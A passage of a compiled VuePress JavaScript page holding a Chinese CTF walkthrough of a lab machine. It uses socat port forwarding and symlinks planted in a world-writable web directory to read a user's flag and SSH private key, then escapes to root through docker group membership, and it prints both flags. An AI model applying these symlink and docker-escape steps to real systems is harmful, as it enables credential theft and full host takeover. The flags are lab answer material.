"),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/link/8.png",alt:""}})]),s._v(" "),a("p",[s._v("把8080映射到8081")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("socat TCP4-LISTEN:8081,reuseaddr,fork TCP4:127.0.0.1:8080\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("访问，txt没什么内容，但是页面暴露了文件绝对路径"),a("code",[s._v("/app/yliken/yliken.txt")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/9.png",alt:""}})]),s._v(" "),a("p",[s._v("发现惊喜，yliken的web目录是www-data用户可控的，如果把yliken用户的user.txt软连接到web目录，我们就可以通过yliken用户身份直接读取web的文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("www-data:/var/www/html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" $ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lah")]),s._v(" /app\ntotal 12K\ndrwxr-xr-x  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" root   root   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Oct "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12")]),s._v(":26 "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\ndrwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("19")]),s._v(" root   root   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Oct "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12")]),s._v(":17 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("\ndrwxr-xrwx  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" yliken yliken "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Oct "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),s._v(" 01:19 yliken\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("尝试一下")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /home/yliken/user.txt /app/yliken/user.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("访问user.txt，成功拿到user.txt")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/10.png",alt:""}})]),s._v(" "),a("p",[s._v("user.txt： flag{2b6d0f77e398476ede85fe65586bf33c}")]),s._v(" "),a("p",[s._v("现在要大胆赌一把，猜测yliken用户的私钥在.ssh下")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /home/yliken/.ssh/id_rsa /app/yliken/key.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/link/11.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"docker逃逸"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#docker逃逸"}},[s._v("#")]),s._v(" docker逃逸")]),s._v(" "),a("p",[s._v("ssh登录yliken后，没有发现suid命令，发现yliken在docker组里，可以使用docker命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/12.png",alt:""}})]),s._v(" "),a("p",[s._v("docker 有ubuntu镜像，可以利用docker提权")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("yliken@link:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" run "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--rm")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-v")]),s._v(" /:/host "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-it")]),s._v(" ubuntu:18.04 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chroot")]),s._v(" /host /bin/bash "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--login")]),s._v("\nmesg: ttyname failed: No such device\nroot@ab8fce60f4b4:/"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ls /root")]),s._v("\nroot.txt\nroot@ab8fce60f4b4:/"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# cat /root/root.txt")]),s._v("\nflag"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("e6a6e8eac98579c8d826d07df3c132bc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("root.txt：flag{e6a6e8eac98579c8d826d07df3c132bc}")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/link/13.png",alt:""}})])])}),[],!1,null,null,null);a.default=e.exports}}]);